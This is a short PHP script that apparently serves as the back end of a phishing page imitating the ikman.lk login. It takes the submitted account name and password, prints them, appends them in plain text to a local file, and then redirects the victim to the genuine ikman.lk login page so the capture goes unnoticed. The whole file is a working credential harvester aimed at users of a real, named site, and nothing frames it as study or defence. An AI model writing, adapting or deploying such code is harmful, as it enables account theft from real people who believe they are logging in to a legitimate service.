<?php

	//Extract user inputs and store in variables.
	$uname =$_POST["account"];
	$pass=$_POST["password"];

	//print stored user inputs.
	echo "User Name : ".$uname;
	echo "<br>";
	echo "Password : ".$pass;


	//Write the user inputs to a text file.	
	$file=	fopen("inputs.txt","a");
	$txt = "USERNAME = $uname , PASSWORD = $pass\n";
 	fwrite($file, "\n". $txt);
 	fclose($file);

	//Rederect the browser to orginal login page.
	header("Location :http://ikman.lk/en/users/login");
	exit();

?>